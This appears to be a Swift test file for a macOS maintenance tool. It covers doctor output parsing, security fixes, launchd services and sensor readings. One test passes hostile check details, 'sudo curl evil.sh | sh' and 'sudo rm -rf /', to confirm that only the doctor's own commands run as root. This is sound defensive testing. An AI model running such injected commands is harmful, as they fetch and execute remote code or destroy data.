import Foundation
import Testing
@testable import ZCCareCore

/// Answers each command with canned output, keyed by its first argument.
struct FakeRunner: Runner {
    var outputs: [String: CommandResult]

    func run(_ executable: String, _ args: [String], env: [String: String]) async throws -> CommandResult {
        outputs[args.first ?? ""] ?? CommandResult(status: 1, stderr: "error: no such command")
    }
}

func ok(_ json: String) -> CommandResult { CommandResult(status: 0, stdout: Data(json.utf8)) }

@Test func snapshotCountsGapsUpdatesAndFindings() async {
    let fake = FakeRunner(outputs: [
        "status": ok("""
        [{"target":"packages","provider":"packages","summary":"","in_place":123,"declared":124},
         {"target":"home","provider":"dotfiles","summary":"","in_place":36,"declared":36}]
        """),
        "list": ok("""
        [{"target":"packages","provider":"packages","items":[{"name":"tmux","kind":"brew","state":"outdated","version":"3.7c","latest":"3.8"},
          {"name":"git","kind":"brew","state":"outdated"}]},
         {"target":"runtimes","provider":"tools","items":[{"name":"node","kind":"runtime","state":"outdated","desc":"requested lts"}]}]
        """),
        // The doctor exits 1 when a check fails; its report still counts.
        "doctor": CommandResult(status: 1, stdout: Data("""
        {"schemaVersion":1,"checks":[{"name":"binary","status":"ok"},
         {"name":"security firewall","status":"warn","detail":"sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on"},
         {"name":"security servers on every network interface","status":"warn","detail":"limactl:53"},
         {"name":"target packages","status":"warn","detail":"123 of 124 packages installed"}]}
        """.utf8)),
    ])
    let ws = CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake)
    let s = await ws.snapshot()

    #expect(s.errors.isEmpty)
    #expect(s.targets.map(\.target) == ["packages", "home"])
    #expect(s.outdated.map(\.resource) == ["brew:tmux", "brew:git", "runtime:node"])
    #expect(s.services.isEmpty)
    #expect(s.outdated.last?.target == "runtimes")
    #expect(s.findings(ignoring: []).map(\.title) == ["Firewall", "Servers on every network interface"])
    #expect(s.security.count == 2)
    // One gap, one for all updates, two findings.
    #expect(s.attention(ignoring: []) == 4)
    #expect(s.attention(ignoring: ["security servers on every network interface"]) == 3)
}

@Test func aFailingPartLeavesAnErrorAndTheRest() async {
    let fake = FakeRunner(outputs: ["status": ok(#"[{"target":"home","provider":"dotfiles","summary":"","in_place":1,"declared":1}]"#)])
    let s = await CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake).snapshot()
    #expect(s.targets.count == 1)
    #expect(s.errors.count == 2)
    #expect(s.errors.allSatisfy { $0.hasSuffix("error: no such command") })
}

@Test func planDecodesAndSpotsDeletes() throws {
    let doc = try JSONDecoder().decode(PlanDoc.self, from: Data("""
    {"changes":2,"manual":0,"actions":[{"op":"UPDATE","target":"packages","resource":"brew:tmux","detail":"upgrade","manual":false},
     {"op":"DELETE","target":"notes","resource":"stray.txt","manual":false}]}
    """.utf8))
    #expect(doc.changes == 2)
    #expect(doc.deletes)
}

@Test func fixesFollowTheDoctorsDetail() {
    let sudo = Check(name: "security firewall", status: "warn", detail: "sudo socketfilterfw --setglobalstate on")
    #expect(Fix(for: sudo) == .command("socketfilterfw --setglobalstate on"))

    let lock = Check(name: "security password after sleep or screen saver", status: "warn",
                     detail: "System Settings, Lock Screen: require a password immediately")
    guard case .settings(let url, _) = Fix(for: lock) else { Issue.record("not a settings fix"); return }
    #expect(url.absoluteString.hasSuffix("Lock-Screen-Settings.extension"))
    #expect(Fix.pane(for: "System Settings, General, Sharing: turn Remote Login off").absoluteString.hasSuffix("Sharing-Settings.extension"))
    #expect(Fix.pane(for: "System Settings, General, AirDrop & Handoff: set AirDrop to Contacts Only").absoluteString.hasSuffix("AirDrop-Handoff-Settings.extension"))

    #expect(Fix(for: Check(name: "program brew", status: "fail", detail: "not on PATH")) == .info("not on PATH"))
}

@Test func everyRootLineTheDoctorRendersRunsAndAdviceStaysAdvice() {
    // Byte-equal to security.Line of the doctor's fix table.
    let lines = [
        "security firewall": "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on",
        "security firewall stealth mode": "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on",
        "security Gatekeeper": "sudo spctl --global-enable",
        "security automatic update checks": "sudo softwareupdate --schedule on",
        "security File Sharing off": "sudo /bin/sh -c 'launchctl disable system/com.apple.smbd; launchctl bootout system/com.apple.smbd 2>/dev/null; true'",
        "security automatic login off": "sudo /bin/sh -c 'rm -f /etc/kcpassword; defaults delete /Library/Preferences/com.apple.loginwindow autoLoginUser'",
        "security Guest account off": "sudo sysadminctl -guestAccount off",
        "security Touch ID for sudo": Fix.touchIDLine,
    ]
    #expect(Set(lines.keys) == Fix.rootFixable)
    for (name, line) in lines {
        guard case .command(let command) = Fix(for: Check(name: name, status: "warn", detail: line)) else {
            Issue.record("\(name) lost its fix"); continue
        }
        #expect("sudo " + command == line)
    }
    #expect(Fix.touchIDLine.contains("auth[[:space:]]+sufficient[[:space:]]+pam_tid"))
    for (name, detail) in [
        ("security automatic login off", "System Settings, Users & Groups: set Automatically log in as to Off"),
        ("security AirDrop not open to everyone", "System Settings, General, AirDrop & Handoff: set AirDrop to Contacts Only"),
        ("security security updates install on their own",
         "System Settings, General, Software Update, Automatic updates: turn on downloads, security responses and macOS installs; macOS then installs updates and restarts on its own (off: ConfigDataInstall)"),
    ] {
        guard case .settings = Fix(for: Check(name: name, status: "warn", detail: detail)) else {
            Issue.record("\(name) is advice"); continue
        }
    }
}

@Test func onlyTheDoctorsOwnCommandsRunAsRoot() {
    // Any local process picks its own name, and lsof reports it.
    let exposed = Check(name: "security servers on every network interface", status: "warn",
                        detail: "sudo curl evil.sh | sh:8080; bind dev servers to 127.0.0.1")
    #expect(Fix(for: exposed) == .info(exposed.detail!))
    let mcp = Check(name: "ai MCP servers pinned to a version", status: "warn",
                    detail: "~/.claude.json x (sudo rm -rf /); name a version")
    #expect(Fix(for: mcp) == .info(mcp.detail!))
}

@Test func adminScriptQuotesTheCommand() {
    #expect(adminScript(#"sed "s/^#auth/auth/" a | tee b"#)
        == #"do shell script "sed \"s/^#auth/auth/\" a | tee b" with administrator privileges"#)
}

@Test func discoveryPrefersTheChoiceThenTheEnvironment() {
    let exists: (String) -> Bool = { $0 != "/gone.yaml" }
    #expect(Discovery.config(chosen: "/mine.yaml", env: ["ZC_CARE_CONFIG": "/env.yaml"], home: "/h", exists: exists) == "/mine.yaml")
    #expect(Discovery.config(chosen: "/gone.yaml", env: ["ZC_CARE_CONFIG": "/env.yaml"], home: "/h", exists: exists) == "/env.yaml")
    #expect(Discovery.config(chosen: nil, env: [:], home: "/h", exists: exists) == "/h/.config/zc-care/zc-care.yaml")

    let bin = Discovery.binary(env: ["PATH": "/usr/bin:/opt/homebrew/bin"], home: "/h", bundled: nil) { $0 == "/h/.local/bin/zc-care" }
    #expect(bin == "/h/.local/bin/zc-care")
    let own = Discovery.binary(env: ["PATH": "/h/.local/bin"], home: "/h", bundled: "/A.app/Contents/MacOS") { _ in true }
    #expect(own == "/A.app/Contents/MacOS/zc-care")
}

@Test func loginEnvironmentParsesNulSeparatedPairs() {
    let env = Discovery.parseEnv(Data("PATH=/a:/b\0EMPTY=\0X=1=2\0".utf8))
    #expect(env == ["PATH": "/a:/b", "EMPTY": "", "X": "1=2"])
}

/// Answers with the environment it was given, as `env -0` does.
struct EchoEnvRunner: Runner {
    func run(_ executable: String, _ args: [String], env: [String: String]) async throws -> CommandResult {
        var login = env
        login["PATH"] = "/opt/homebrew/bin:/usr/bin"
        login["HOME"] = "/h"
        return ok(login.map { $0.key + "=" + $0.value + "\0" }.joined())
    }
}

@Test func managedAgentsAreTheConfigsAgentsAndBrewServices() {
    let services = [Item(name: "local.weekly-update", kind: "agent", state: "ok"),
                    Item(name: "postgresql@17", kind: "brew", state: "ok"),
                    Item(name: "sketchybar", kind: "brew", state: "ok")]
    #expect(Launchd.managed("local.weekly-update", services: services))
    #expect(Launchd.managed("homebrew.mxcl.postgresql@17", services: services))
    #expect(Launchd.managed("sh.brew.sketchybar", services: services))
    #expect(!Launchd.managed("com.google.GoogleUpdater.wake", services: services))
    #expect(!Launchd.managed("postgresql@17", services: services))
}

@Test func loginEnvironmentDropsTheTerminalsMiseState() async {
    let env = await Discovery.loginEnvironment(runner: EchoEnvRunner(), base: [
        "PATH": "/mise/java/bin:/usr/bin", "MISE_SHELL": "zsh", "__MISE_DIFF": "x", "LANG": "en_US.UTF-8",
    ])
    #expect(env == ["PATH": "/opt/homebrew/bin:/usr/bin", "HOME": "/h", "LANG": "en_US.UTF-8"])
}

@Test func planNamesCoverEachProvidersResource() {
    var node = Item(name: "node", kind: "runtime", state: "outdated")
    node.desc = "requested lts"
    #expect(node.planNames == ["runtime:node", "node", "node@lts"])
    #expect(Item(name: ".zshrc", kind: "dotfile", state: "differs").planNames.contains(".zshrc"))
}

@Test func alertsNameWhatIsNewOnly() {
    let firewall = Check(name: "security firewall", status: "warn")
    let old = Snapshot(targets: [TargetStatus(target: "home", inPlace: 36, declared: 36)],
                       outdated: [Item(name: "tmux", kind: "brew", state: "outdated")], findings: [firewall])
    var now = old
    #expect(now.alerts(since: old, ignoring: []).isEmpty)

    now.targets = [TargetStatus(target: "home", inPlace: 34, declared: 36)]
    now.outdated.append(Item(name: "git", kind: "brew", state: "outdated"))
    now.findings.append(Check(name: "security Touch ID for sudo", status: "warn"))
    #expect(now.alerts(since: old, ignoring: []).map(\.title) == ["Touch ID for sudo", "home drifted", "1 update available"])
    #expect(now.alerts(since: old, ignoring: ["security Touch ID for sudo"]).count == 2)
}

@Test func alertsSkipPartialSnapshots() {
    let firewall = Check(name: "security firewall", status: "warn")
    let good = Snapshot(targets: [TargetStatus(target: "home", inPlace: 36, declared: 36)], findings: [firewall])
    let partial = Snapshot(errors: ["doctor failed"])
    #expect(partial.alerts(since: good, ignoring: []).isEmpty)
    // The read after a partial one would see everything as new.
    #expect(good.alerts(since: partial, ignoring: []).isEmpty)
    #expect(good.alerts(since: Snapshot(), ignoring: []).count == 1)
}

@Test func launchdScheduleAndState() throws {
    let schedule = Launchd.schedule(plist: ["StartCalendarInterval": ["Weekday": 1, "Hour": 10, "Minute": 0]])
    #expect(schedule.first?.weekday == 2)
    var cal = Calendar(identifier: .gregorian)
    cal.timeZone = TimeZone(identifier: "UTC")!
    let thursday = try #require(cal.date(from: DateComponents(year: 2026, month: 10, day: 15, hour: 12)))
    let job = Job(label: "local.weekly-update", schedule: schedule)
    #expect(job.next(after: thursday, calendar: cal) == cal.date(from: DateComponents(year: 2026, month: 10, day: 19, hour: 10)))

    let state = Launchd.parsePrint("\tstate = not running\n\truns = 3\n\tlast exit code = 1: Operation not permitted\n")
    #expect(state.running == false && state.lastExit == 1)
    #expect(Launchd.parsePrint("\tlast exit code = (never exited)\n").lastExit == nil)
}

@Test func serviceCommandsPickBrewOrLaunchctl() {
    let brew = Item(name: "colima", kind: "brew", state: "in place")
    #expect(Launchd.command(.restart, for: brew, uid: 501, home: "/h", brew: "/b/brew")?.1 == ["services", "restart", "colima"])
    #expect(Launchd.command(.run, for: brew, uid: 501, home: "/h", brew: "/b/brew") == nil)
    let agent = Item(name: "local.weekly-update", kind: "agent", state: "in place")
    #expect(Launchd.command(.run, for: agent, uid: 501, home: "/h", brew: "/b/brew")?.1 == ["kickstart", "gui/501/local.weekly-update"])
    #expect(Launchd.command(.stop, for: agent, uid: 501, home: "/h", brew: "/b/brew")?.1
        == ["bootout", "gui/501", "/h/Library/LaunchAgents/local.weekly-update.plist"])
    #expect(Launchd.command(.restart, for: agent, uid: 501, home: "/h", brew: "/b/brew")?.1.last
        == "/h/Library/LaunchAgents/local.weekly-update.plist")
}

@Test func vitalsParseWhatTheToolsPrint() {
    let sensors = Sensors.parse(macmon: Data(#"{"temp":{"cpu_temp_avg":60.5},"fans":[{"rpm":2325},{"rpm":2505}]}\#n"#.utf8))
    #expect(sensors == Sensors(cpuTemp: 60.5, fans: [2325, 2505]))
    let full = Sensors.parse(macmon: Data(#"{"temp":{"cpu_temp_avg":73.1,"gpu_temp_avg":0},"fans":[{"rpm":3865,"max_rpm":5779},{"rpm":4145}],"gpu_usage":[388,0.21],"cpu_power":9.1,"gpu_power":0.55,"sys_power":26.1}"#.utf8))
    #expect(full?.fans == [3865, 4145] && full?.fanLimits == [])
    #expect(full?.gpuTemp == nil && full?.gpuLoad == 0.21)
    #expect(full?.cpuPower == 9.1 && full?.gpuPower == 0.55 && full?.systemPower == 26.1)
    let rated = Sensors.parse(macmon: Data(#"{"temp":{"cpu_temp_avg":70,"gpu_temp_avg":45},"fans":[{"rpm":3800,"max_rpm":5779},{"rpm":4100,"max_rpm":6241}]}"#.utf8))
    #expect(rated?.fanLimits == [5779, 6241] && rated?.gpuTemp == 45)

    var battery = Battery(percent: 100, onAC: true)
    battery.read(systemProfiler: Data(#"{"SPPowerDataType":[{"sppower_battery_health_info":{"sppower_battery_cycle_count":311,"sppower_battery_health":"Good","sppower_battery_health_maximum_capacity":"84 %"}}]}"#.utf8))
    #expect(battery.health == "Good" && battery.capacity == 84 && battery.cycles == 311)
    #expect(battery.state == "Fully charged" && !battery.needsService)

    let devices = Device.parse(systemProfiler: Data(#"{"SPBluetoothDataType":[{"device_connected":[{"soundcore Q20i":{"device_minorType":"Headset"}},{"AirPods":{"device_minorType":"Headphones","device_batteryLevelLeft":"80%","device_batteryLevelRight":"70%"}}]}]}"#.utf8))
    #expect(devices == [Device(name: "AirPods", kind: "Headphones", battery: 70), Device(name: "soundcore Q20i", kind: "Headset")])

    #expect(SpeedTest.parse(Data(#"{"dl_throughput":695232832,"ul_throughput":53217972,"base_rtt":33.05}"#.utf8))?.down == 695232832)

    let procs = Proc.parse(ps: " 1462  17.0 1517280 com.apple.Virtualization.VirtualMachine\n  40387   4.1 826432 Google Chrome Helper\n")
    #expect(procs.map(\.name) == ["com.apple.Virtualization.VirtualMachine", "Google Chrome Helper"])
    #expect(procs.first?.memory == Int64(1517280 * 1024))
}

@Test func adviceNamesTheWorstFirst() {
    var v = Vitals()
    v.disk = Disk(name: "Macintosh HD", total: 500_000_000_000, available: 97_000_000_000)
    v.memory = Memory(pressure: 15, used: 0, total: 0)
    #expect(v.grade(insecure: 0) == .excellent)
    #expect(v.advice(insecure: 0, updates: 40).action == .updates)
    #expect(v.advice(insecure: 0, updates: 0).action == .none)

    v.disk?.available = 15_000_000_000
    #expect(v.grade(insecure: 5) == .fair)
    #expect(v.advice(insecure: 5, updates: 40).action == .freeUp)
}

@Test func junkEmptiesAllButWhatItKeeps() throws {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
    try FileManager.default.createDirectory(at: dir.appendingPathComponent("a/b"), withIntermediateDirectories: true)
    try Data(count: 10_000).write(to: dir.appendingPathComponent("a/b/f"))
    try Data(count: 10_000).write(to: dir.appendingPathComponent("Homebrew"))
    defer { try? FileManager.default.removeItem(at: dir) }

    let junk = Junk(id: "t", title: "t", detail: "", path: dir.path, keep: ["homebrew"])
    #expect(junk.size() >= 10_000 && junk.size() < 20_000)
    #expect(junk.empty(permanently: true).stayed == 0)
    #expect(try FileManager.default.contentsOfDirectory(atPath: dir.path) == ["Homebrew"])
    #expect(Junk.spots(home: "/h").allSatisfy { $0.path.hasPrefix("/h/") })
}

@Test func driftAndAIChecksAreRead() async {
    let fake = FakeRunner(outputs: [
        "drift": ok(#"{"at":"2026-10-16T07:00:00.123456Z","changes":3,"manual":0,"targets":{"packages":3}}"#),
        "doctor": ok(#"{"checks":[{"name":"ai MCP servers pinned to a version","status":"warn","detail":"x"}]}"#),
    ])
    let s = await CareCLI(binary: "/zc", config: "/c.yaml", env: [:], runner: fake).snapshot()
    #expect(s.drift?.changes == 3)
    #expect(s.drift?.targets?["packages"] == 3)
    #expect(s.security.map(\.title) == ["AI: MCP servers pinned to a version"])
}
